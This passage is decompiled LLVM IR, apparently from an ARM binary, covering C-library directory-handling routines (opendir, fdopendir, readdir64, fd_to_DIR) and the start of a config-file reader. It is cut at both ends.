  %v0_1553c = phi i32 [ %v0_15510, %dec_label_pc_154a0 ], [ %v0_15538, %dec_label_pc_1552c ]
  store i32 %v0_1553c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15540

dec_label_pc_15540:                               ; preds = %dec_label_pc_1548c, %dec_label_pc_1553c
  %v0_15540 = phi i32 [ %v0_15540.pre, %dec_label_pc_1548c ], [ %v0_1553c, %dec_label_pc_1553c ]
  %v2_15548 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15548, i32* %r4.global-to-local, align 4
  ret i32 %v0_15540

; uselistorder directives
  uselistorder i32 %v0_15510, { 1, 0 }
  uselistorder label %dec_label_pc_15540, { 1, 0 }
  uselistorder label %dec_label_pc_1553c, { 1, 0 }
}

define i32 @function_15554(i32 %arg1) local_unnamed_addr {
dec_label_pc_15554:
  %v0_15554 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15554, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15554
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15554, %bb
  %v10_15560 = phi i32 [ %arg1, %dec_label_pc_15554 ], [ 0, %bb ]
  ret i32 %v10_15560

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_15564 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_15578 = call i32 @malloc(i32 48)
  %v2_15580 = icmp eq i32 %v1_15578, 0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  br i1 %v2_15580, label %bb, label %dec_label_pc_15590

bb:                                               ; preds = %entry
  br label %dec_label_pc_1561c

dec_label_pc_15590:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15594 = load i32, i32* @r4, align 4
  %v2_15594 = icmp ugt i32 %v0_15594, 511
  %v2_15598 = add i32 %v1_15578, 4
  %v3_15598 = inttoptr i32 %v2_15598 to i32*
  store i32 0, i32* %v3_15598, align 4
  %v0_1559c = load i32, i32* %r3.global-to-local, align 4
  %v2_1559c = add i32 %v1_15578, 16
  %v3_1559c = inttoptr i32 %v2_1559c to i32*
  store i32 %v0_1559c, i32* %v3_1559c, align 4
  %v0_155a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_155a0 = add i32 %v1_15578, 8
  %v3_155a0 = inttoptr i32 %v2_155a0 to i32*
  store i32 %v0_155a0, i32* %v3_155a0, align 4
  br i1 %v2_15594, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_15590
  %v0_155a82 = load i32, i32* @r4, align 4
  %v2_155a83 = add i32 %v1_15578, 20
  %v3_155a84 = inttoptr i32 %v2_155a83 to i32*
  store i32 %v0_155a82, i32* %v3_155a84, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_15590
  %v1_155a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 512
  store i32 %v2_155a4, i32* %r3.global-to-local, align 4
  %v0_155a8 = load i32, i32* @r4, align 4
  %v2_155a8 = add i32 %v1_15578, 20
  %v3_155a8 = inttoptr i32 %v2_155a8 to i32*
  store i32 %v0_155a8, i32* %v3_155a8, align 4
  %v1_155ac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_155ac, i32* %v3_155a8, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_15578, i32* @r5, align 4
  %v0_155b4 = load i32, i32* @r7, align 4
  %v2_155b4 = inttoptr i32 %v1_15578 to i32*
  store i32 %v0_155b4, i32* %v2_155b4, align 4
  %v0_155b8 = load i32, i32* @r5, align 4
  %v1_155b8 = add i32 %v0_155b8, 20
  %v2_155b8 = inttoptr i32 %v1_155b8 to i32*
  %v3_155b8 = load i32, i32* %v2_155b8, align 4
  store i32 %v3_155b8, i32* %r1.global-to-local, align 4
  %v2_155c0 = call i32 @calloc(i32 1, i32 %v3_155b8)
  %v2_155c4 = icmp eq i32 %v2_155c0, 0
  store i32 %v2_155c0, i32* @r4, align 4
  %v1_155cc = load i32, i32* @r5, align 4
  %v2_155cc = add i32 %v1_155cc, 12
  %v3_155cc = inttoptr i32 %v2_155cc to i32*
  store i32 %v2_155c0, i32* %v3_155cc, align 4
  br i1 %v2_155c4, label %dec_label_pc_155d4, label %dec_label_pc_155e4

dec_label_pc_155d4:                               ; preds = %bb17
  %v0_155d4 = load i32, i32* @r5, align 4
  store i32 %v0_155d4, i32* @r0, align 4
  %v0_155d8 = call i32 @free()
  %v0_155dc = load i32, i32* @r4, align 4
  br label %dec_label_pc_1561c

dec_label_pc_155e4:                               ; preds = %bb17
  %v0_155e8 = load i32, i32* @r6, align 4
  %v2_155e8 = add i32 %v0_155e8, -33076
  store i32 %v2_155e8, i32* %r3.global-to-local, align 4
  %v1_155f0 = inttoptr i32 %v2_155e8 to i32*
  %v2_155f0 = load i32, i32* %v1_155f0, align 4
  %v3_155f0 = add i32 %v0_155e8, -33072
  %v4_155f0 = inttoptr i32 %v3_155f0 to i32*
  %v5_155f0 = load i32, i32* %v4_155f0, align 4
  store i32 %v5_155f0, i32* %r1.global-to-local, align 4
  %v6_155f0 = add i32 %v0_155e8, -33068
  %v7_155f0 = inttoptr i32 %v6_155f0 to i32*
  %v8_155f0 = load i32, i32* %v7_155f0, align 4
  store i32 %v8_155f0, i32* %r2.global-to-local, align 4
  %v9_155f0 = add i32 %v0_155e8, -33064
  %v10_155f0 = inttoptr i32 %v9_155f0 to i32*
  %v11_155f0 = load i32, i32* %v10_155f0, align 4
  store i32 %v11_155f0, i32* %r3.global-to-local, align 4
  %v12_155f0 = add i32 %v0_155e8, -33060
  %v1_155fc = inttoptr i32 %v12_155f0 to i32*
  %v2_155fc = load i32, i32* %v1_155fc, align 4
  %v3_155fc = add i32 %v0_155e8, -33056
  %v4_155fc = inttoptr i32 %v3_155fc to i32*
  %v5_155fc = load i32, i32* %v4_155fc, align 4
  store i32 %v2_155fc, i32* %stack_var_-32, align 4
  store i32 %v5_155f0, i32* %r1.global-to-local, align 4
  store i32 %v8_155f0, i32* %r2.global-to-local, align 4
  store i32 %v11_155f0, i32* %r3.global-to-local, align 4
  %v0_1560c = load i32, i32* @r5, align 4
  %v1_1560c = add i32 %v0_1560c, 24
  %v1_15610 = inttoptr i32 %v1_1560c to i32*
  store i32 %v2_155f0, i32* %v1_15610, align 4
  %v3_15610 = add i32 %v0_1560c, 28
  %v4_15610 = inttoptr i32 %v3_15610 to i32*
  %v5_15610 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15610, i32* %v4_15610, align 4
  %v6_15610 = add i32 %v0_1560c, 32
  %v7_15610 = inttoptr i32 %v6_15610 to i32*
  %v8_15610 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15610, i32* %v7_15610, align 4
  %v9_15610 = add i32 %v0_1560c, 36
  %v10_15610 = inttoptr i32 %v9_15610 to i32*
  %v11_15610 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_15610, i32* %v10_15610, align 4
  %v12_15610 = add i32 %v0_1560c, 40
  %v2_15614 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_155fc, i32* %r1.global-to-local, align 4
  %v1_15618 = inttoptr i32 %v12_15610 to i32*
  store i32 %v2_15614, i32* %v1_15618, align 4
  %v3_15618 = add i32 %v0_1560c, 44
  %v4_15618 = inttoptr i32 %v3_15618 to i32*
  %v5_15618 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15618, i32* %v4_15618, align 4
  %v0_1561c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1561c

dec_label_pc_1561c:                               ; preds = %bb, %dec_label_pc_155d4, %dec_label_pc_155e4
  %v0_1561c = phi i32 [ 0, %bb ], [ %v0_155dc, %dec_label_pc_155d4 ], [ %v0_1561c.pre, %dec_label_pc_155e4 ]
  store i32 %v12_15564, i32* @r7, align 4
  ret i32 %v0_1561c

; uselistorder directives
  uselistorder i32 %v2_155c0, { 1, 0, 2 }
  uselistorder i32 %v1_15578, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1561c, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1563c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_15664, label %dec_label_pc_15654

dec_label_pc_15654:                               ; preds = %entry
  %v0_15654 = call i32 @__GI___errno_location()
  %v0_15658 = load i32, i32* @r7, align 4
  %v1_15658 = sub i32 0, %v0_15658
  %v2_1565c = inttoptr i32 %v0_15654 to i32*
  store i32 %v1_15658, i32* %v2_1565c, align 4
  br label %dec_label_pc_15688

dec_label_pc_15664:                               ; preds = %entry
  %v1_15664 = icmp slt i32 %arg1, 0
  br i1 %v1_15664, label %dec_label_pc_15688, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15664
  store i32 %v2_1563c, i32* @r1, align 4
  %v0_15670 = call i32 @fstat()
  %v1_15674 = icmp slt i32 %v0_15670, 0
  br i1 %v1_15674, label %dec_label_pc_1567c, label %dec_label_pc_15690

dec_label_pc_1567c:                               ; preds = %dec_label_pc_1566c
  br label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %dec_label_pc_1567c, %dec_label_pc_15664, %dec_label_pc_15654
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156cc

dec_label_pc_15690:                               ; preds = %dec_label_pc_1566c
  %v0_15698 = load i32, i32* @r7, align 4
  %v3_1569c = call i32 @__GI___fcntl_nocancel(i32 %v0_15698, i32 2, i32 1)
  %v0_156a0 = load i32, i32* @r7, align 4
  %v2_156a8 = call i32 @fd_to_DIR(i32 %v0_156a0, i32 %tmp)
  store i32 %v2_156a8, i32* %r4.global-to-local, align 4
  %v2_156ac = icmp eq i32 %v2_156a8, 0
  br i1 %v2_156ac, label %dec_label_pc_156b4, label %dec_label_pc_156cc

dec_label_pc_156b4:                               ; preds = %dec_label_pc_15690
  %v0_156c0 = call i32 @__GI___errno_location()
  %v2_156c8 = inttoptr i32 %v0_156c0 to i32*
  store i32 12, i32* %v2_156c8, align 4
  %v0_156cc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156cc

dec_label_pc_156cc:                               ; preds = %dec_label_pc_15690, %dec_label_pc_15688, %dec_label_pc_156b4
  %v0_156cc = phi i32 [ %v2_156a8, %dec_label_pc_15690 ], [ 0, %dec_label_pc_15688 ], [ %v0_156cc.pre, %dec_label_pc_156b4 ]
  ret i32 %v0_156cc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_156cc, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_156e4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_156e4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_156f0 = call i32 @fstat()
  store i32 %v0_156f0, i32* @r5, align 4
  %v2_156f4 = icmp eq i32 %v0_156f0, 0
  br i1 %v2_156f4, label %dec_label_pc_156fc, label %dec_label_pc_15764

dec_label_pc_156fc:                               ; preds = %entry
  %v1_15700 = and i32 %tmp4, 61440
  store i32 %v1_15700, i32* @r3, align 4
  %v7_15704 = icmp eq i32 %v1_15700, 16384
  br i1 %v7_15704, label %dec_label_pc_1571c, label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %dec_label_pc_156fc
  %v0_1570c = call i32 @__GI___errno_location()
  br label %dec_label_pc_15748

dec_label_pc_1571c:                               ; preds = %dec_label_pc_156fc
  %v0_1571c = load i32, i32* @r4, align 4
  %v2_15724 = call i32 @__libc_fcntl(i32 %v0_1571c, i32 3)
  %v7_15728 = icmp eq i32 %v2_15724, -1
  br i1 %v7_15728, label %dec_label_pc_15764, label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %dec_label_pc_1571c
  %v1_15730 = urem i32 %v2_15724, 4
  %v7_15734 = icmp eq i32 %v1_15730, 1
  br i1 %v7_15734, label %dec_label_pc_1573c, label %dec_label_pc_15750

dec_label_pc_1573c:                               ; preds = %dec_label_pc_15730
  %v0_1573c = call i32 @__GI___errno_location()
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_1570c, %dec_label_pc_1573c
  %storemerge2 = phi i32 [ %v0_1570c, %dec_label_pc_1570c ], [ %v0_1573c, %dec_label_pc_1573c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1570c ], [ 22, %dec_label_pc_1573c ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_15748 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_15748, align 4
  %v0_15768.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15768

dec_label_pc_15750:                               ; preds = %dec_label_pc_15730
  %v0_15750 = load i32, i32* @r4, align 4
  %v2_15758 = call i32 @fd_to_DIR(i32 %v0_15750, i32 %tmp)
  store i32 %v2_15758, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15768

dec_label_pc_15764:                               ; preds = %entry, %dec_label_pc_1571c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %dec_label_pc_15750, %dec_label_pc_15748, %dec_label_pc_15764
  %v0_15768 = phi i32 [ %v2_15758, %dec_label_pc_15750 ], [ %v0_15768.pre, %dec_label_pc_15748 ], [ 0, %dec_label_pc_15764 ]
  ret i32 %v0_15768

; uselistorder directives
  uselistorder i32 %v2_15724, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_15768, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15764, { 1, 0 }
  uselistorder label %dec_label_pc_15748, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  %v1_1578c = add i32 %tmp, 24
  store i32 %v1_1578c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_157a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 %v4_157a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_157a4)
  %v0_157b8 = load i32, i32* @r6, align 4
  %v2_157b8 = add i32 %v0_157b8, 16
  %v3_157b8 = inttoptr i32 %v2_157b8 to i32*
  %v4_157b8 = load i32, i32* %v3_157b8, align 4
  store i32 %v4_157b8, i32* %ip.global-to-local, align 4
  store i32 88004, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_157b8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %dec_label_pc_157f8, %entry
  %v0_157c8 = load i32, i32* @r5, align 4
  %v1_157c8 = add i32 %v0_157c8, 4
  %v2_157c8 = inttoptr i32 %v1_157c8 to i32*
  %v3_157c8 = load i32, i32* %v2_157c8, align 4
  %v4_157c8 = add i32 %v0_157c8, 8
  %v5_157c8 = inttoptr i32 %v4_157c8 to i32*
  %v6_157c8 = load i32, i32* %v5_157c8, align 4
  %tmp10 = icmp ugt i32 %v6_157c8, %v3_157c8
  br i1 %tmp10, label %dec_label_pc_157f8, label %dec_label_pc_157d4

dec_label_pc_157d4:                               ; preds = %dec_label_pc_157c8
  %v1_157d4 = inttoptr i32 %v0_157c8 to i32*
  %v2_157d4 = load i32, i32* %v1_157d4, align 4
  %v1_157d8 = add i32 %v0_157c8, 12
  %v2_157d8 = inttoptr i32 %v1_157d8 to i32*
  %v3_157d8 = load i32, i32* %v2_157d8, align 4
  %v1_157dc = add i32 %v0_157c8, 20
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  %v4_157e0 = inttoptr i32 %v3_157d8 to i32*
  %v5_157e0 = call i32 @__getdents64(i32 %v2_157d4, i32* %v4_157e0, i32 %v3_157dc, i32 %v6_157c8)
  %tmp9 = icmp slt i32 %v5_157e0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_157f0

.thread:                                          ; preds = %dec_label_pc_157d4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15828

dec_label_pc_157f0:                               ; preds = %dec_label_pc_157d4
  %v1_157f0 = load i32, i32* @r5, align 4
  %v2_157f0 = add i32 %v1_157f0, 8
  %v3_157f0 = inttoptr i32 %v2_157f0 to i32*
  store i32 %v5_157e0, i32* %v3_157f0, align 4
  %v0_157f4 = load i32, i32* @r7, align 4
  %v1_157f4 = load i32, i32* @r5, align 4
  %v2_157f4 = add i32 %v1_157f4, 4
  %v3_157f4 = inttoptr i32 %v2_157f4 to i32*
  store i32 %v0_157f4, i32* %v3_157f4, align 4
  %v0_157f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_157f8

dec_label_pc_157f8:                               ; preds = %dec_label_pc_157c8, %dec_label_pc_157f0
  %v1_1581c = phi i32 [ %v0_157c8, %dec_label_pc_157c8 ], [ %v0_157f8.pre, %dec_label_pc_157f0 ]
  %v1_157f8 = add i32 %v1_1581c, 4
  %v2_157f8 = inttoptr i32 %v1_157f8 to i32*
  %v3_157f8 = load i32, i32* %v2_157f8, align 4
  %v1_157fc = add i32 %v1_1581c, 12
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  %v2_15800 = add i32 %v3_157fc, %v3_157f8
  store i32 %v2_15800, i32* @r4, align 4
  %v3_15804 = inttoptr i32 %v2_15800 to i32*
  %v4_15804 = load i32, i32* %v3_15804, align 4
  %v1_15808 = add i32 %v2_15800, 4
  %v2_15808 = inttoptr i32 %v1_15808 to i32*
  %v3_15808 = load i32, i32* %v2_15808, align 4
  %v1_1580c = add i32 %v2_15800, 16
  %v2_1580c = inttoptr i32 %v1_1580c to i16*
  %v3_1580c = load i16, i16* %v2_1580c, align 2
  %v4_1580c = zext i16 %v3_1580c to i32
  %v1_15810 = add i32 %v2_15800, 8
  %v2_15810 = inttoptr i32 %v1_15810 to i32*
  %v3_15810 = load i32, i32* %v2_15810, align 4
  store i32 %v3_15810, i32* %ip.global-to-local, align 4
  %v2_15814 = add i32 %v4_1580c, %v3_157f8
  %v2_15818 = or i32 %v3_15808, %v4_15804
  %v4_15818 = icmp eq i32 %v2_15818, 0
  store i32 %v2_15814, i32* %v2_157f8, align 4
  %v0_15820 = load i32, i32* %ip.global-to-local, align 4
  %v1_15820 = load i32, i32* @r5, align 4
  %v2_15820 = add i32 %v1_15820, 16
  %v3_15820 = inttoptr i32 %v2_15820 to i32*
  store i32 %v0_15820, i32* %v3_15820, align 4
  br i1 %v4_15818, label %dec_label_pc_157c8, label %dec_label_pc_15828

dec_label_pc_15828:                               ; preds = %dec_label_pc_157f8, %.thread
  %v0_15834 = load i32, i32* @r6, align 4
  %v2_15834 = add i32 %v0_15834, 24
  %v3_15834 = inttoptr i32 %v2_15834 to i32*
  %v4_15834 = load i32, i32* %v3_15834, align 4
  store i32 %v4_15834, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15834)
  %v0_15840 = load i32, i32* @r4, align 4
  ret i32 %v0_15840

; uselistorder directives
  uselistorder i32 %v2_15800, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1581c, { 1, 0 }
  uselistorder i32 %v6_157c8, { 1, 0 }
  uselistorder i32 %v0_157c8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_157f8, { 1, 0 }
}

define i32 @function_15854(i32 %arg1) local_unnamed_addr {
dec_label_pc_15854:
  %v0_15854 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15854, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15854
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15854, %bb
  %v10_15860 = phi i32 [ %arg1, %dec_label_pc_15854 ], [ 0, %bb ]
  ret i32 %v10_15860

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27608)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15880 = load i32, i32* @r4, align 4
  %v6_15880 = load i32, i32* @r5, align 4
  %v9_15880 = load i32, i32* @r6, align 4
  %v12_15880 = load i32, i32* @r7, align 4
  %v15_15880 = load i32, i32* @r8, align 4
  %v18_15880 = load i32, i32* @sb, align 4
  %v21_15880 = load i32, i32* @sl, align 4
  %v24_15880 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15884 = icmp eq i32* %arg1, null
  store i1 %v2_15884, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15884, label %dec_label_pc_15b94, label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %entry
  %v1_1589c = urem i32 %arg3, 256
  store i32 %v1_1589c, i32* @sb, align 4
  %v1_158a0 = udiv i32 %arg3, 256
  %v3_158a4 = urem i32 %v1_158a0, 256
  %v3_158a8 = mul nuw nsw i32 %v1_1589c, 4
  %v1_158b0 = or i32 %v3_158a8, 1
  %v1_158bc = and i32 %arg3, 131072
  %v1_158c0 = add nsw i32 %v1_1589c, -1
  %v1_158cc = and i32 %arg3, 262144
  store i32 %v1_158cc, i32* %r2.global-to-local, align 4
  %v1_158d0 = and i32 %arg3, 65536
  store i32 %v1_158d0, i32* %r3.global-to-local, align 4
  store i32 %v1_158d0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_158e0 = add i32 %arg4, 1
  store i32 %v1_158e0, i32* @sl, align 4
  %v2_15a60 = inttoptr i32 %arg2 to i32*
  %v2_15a70 = icmp eq i32 %v1_158bc, 0
  %v2_15ac8 = icmp eq i32 %v1_158cc, 0
  br label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158e4.backedge, %dec_label_pc_1589c
  %v2_15900 = phi i32 [ %v0_158e4.pre, %dec_label_pc_158e4.backedge ], [ %tmp, %dec_label_pc_1589c ]
  %v1_158e4 = add i32 %v2_15900, 4
  %v2_158e4 = inttoptr i32 %v1_158e4 to i32*
  %v3_158e4 = load i32, i32* %v2_158e4, align 4
  store i32 %v3_158e4, i32* %r3.global-to-local, align 4
  %v2_158e8 = icmp eq i32 %v3_158e4, 0
  store i1 %v2_158e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158e8, label %dec_label_pc_158f0, label %dec_label_pc_15938

dec_label_pc_158f0:                               ; preds = %dec_label_pc_158e4
  %v1_158f0 = add i32 %v2_15900, 16
  %v2_158f0 = inttoptr i32 %v1_158f0 to i32*
  %v3_158f0 = load i32, i32* %v2_158f0, align 4
  store i32 %v3_158f0, i32* %r3.global-to-local, align 4
  %v2_158f4 = icmp eq i32 %v3_158f0, 0
  store i1 %v2_158f4, i1* %cpsr_z.global-to-local, align 1
  %v1_158f8 = add i32 %v2_15900, 8
  %v2_158f8 = inttoptr i32 %v1_158f8 to i32*
  %v3_158f8 = load i32, i32* %v2_158f8, align 4
  store i32 %v3_158f8, i32* %r3.global-to-local, align 4
  br i1 %v2_158f4, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_158f0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_158f0, align 4
  %v0_15904.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_158f0, %bb
  %v0_15904 = phi i32 [ %v0_15904.pre, %bb ], [ %v3_158f8, %dec_label_pc_158f0 ]
  %v2_15904 = icmp eq i32 %v0_15904, 0
  store i1 %v2_15904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15904, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_158b0, i32* %r3.global-to-local, align 4
  %v2_1590c = load i32, i32* @r5, align 4
  %v3_1590c = add i32 %v2_1590c, 8
  %v4_1590c = inttoptr i32 %v3_1590c to i32*
  store i32 %v1_158b0, i32* %v4_1590c, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_15910 = load i32, i32* @r5, align 4
  %v1_15910 = add i32 %v0_15910, 16
  %v2_15910 = inttoptr i32 %v1_15910 to i32*
  %v3_15910 = load i32, i32* %v2_15910, align 4
  store i32 %v3_15910, i32* %r0.global-to-local, align 4
  %v1_15914 = add i32 %v0_15910, 8
  %v2_15914 = inttoptr i32 %v1_15914 to i32*
  %v3_15914 = load i32, i32* %v2_15914, align 4
  store i32 %v3_15914, i32* %r3.global-to-local, align 4
  %v2_15918 = add i32 %v3_15914, %v3_15910
  store i32 %v2_15918, i32* %r0.global-to-local, align 4
  %v1_1591c = call i32 @malloc(i32 %v2_15918)
  store i32 %v1_1591c, i32* %r0.global-to-local, align 4
  %v2_15920 = icmp eq i32 %v1_1591c, 0
  store i1 %v2_15920, i1* %cpsr_z.global-to-local, align 1
  %v1_15924 = load i32, i32* @r5, align 4
  %v2_15924 = add i32 %v1_15924, 4
  %v3_15924 = inttoptr i32 %v2_15924 to i32*
  store i32 %v1_1591c, i32* %v3_15924, align 4
  br i1 %v2_15920, label %dec_label_pc_15b94, label %dec_label_pc_1592c

dec_label_pc_1592c:                               ; preds = %.thread
  %v0_1592c = load i32, i32* @r5, align 4
  %v1_1592c = add i32 %v0_1592c, 20
  %v2_1592c = inttoptr i32 %v1_1592c to i32*
  %v3_1592c = load i32, i32* %v2_1592c, align 4
  %v1_15930 = or i32 %v3_1592c, 1
  store i32 %v1_15930, i32* %r3.global-to-local, align 4
  store i32 %v1_15930, i32* %v2_1592c, align 4
  %v0_15938.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15938

dec_label_pc_15938:                               ; preds = %dec_label_pc_158e4, %dec_label_pc_1592c
  %v1_15940 = phi i32 [ %v2_15900, %dec_label_pc_158e4 ], [ %v0_15938.pre, %dec_label_pc_1592c ]
  %v1_15938 = add i32 %v1_15940, 4
  %v2_15938 = inttoptr i32 %v1_15938 to i32*
  %v3_15938 = load i32, i32* %v2_15938, align 4
  store i32 %v3_15938, i32* %r2.global-to-local, align 4
  %v4_15938 = add i32 %v1_15940, 8
  %v5_15938 = inttoptr i32 %v4_15938 to i32*
  %v6_15938 = load i32, i32* %v5_15938, align 4
  %v2_1593c = add i32 %v6_15938, %v3_15938
  store i32 %v2_1593c, i32* %r3.global-to-local, align 4
  %v2_15940 = add i32 %v1_15940, 12
  %v3_15940 = inttoptr i32 %v2_15940 to i32*
  store i32 %v2_1593c, i32* %v3_15940, align 4
  %v0_15944 = load i32, i32* @fp, align 4
  store i32 %v0_15944, i32* @r6, align 4
  br label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %dec_label_pc_159d4, %dec_label_pc_159c0, %dec_label_pc_15938
  %v0_15950 = phi i32 [ %v0_15944, %dec_label_pc_15938 ], [ %v1_159c0, %dec_label_pc_159c0 ], [ %v0_15950.pre.pre, %dec_label_pc_159d4 ]
  %v0_15948 = load i32, i32* @r5, align 4
  %v1_15948 = add i32 %v0_15948, 12
  store i32 %v1_15948, i32* %r0.global-to-local, align 4
  %v1_1594c = inttoptr i32 %v1_15948 to i32*
  %v2_1594c = load i32, i32* %v1_1594c, align 4
  store i32 %v2_1594c, i32* %r0.global-to-local, align 4
  %v3_1594c = add i32 %v0_15948, 16
  %v4_1594c = inttoptr i32 %v3_1594c to i32*
  %v5_1594c = load i32, i32* %v4_1594c, align 4
  %v2_15950 = add i32 %v2_1594c, %v0_15950
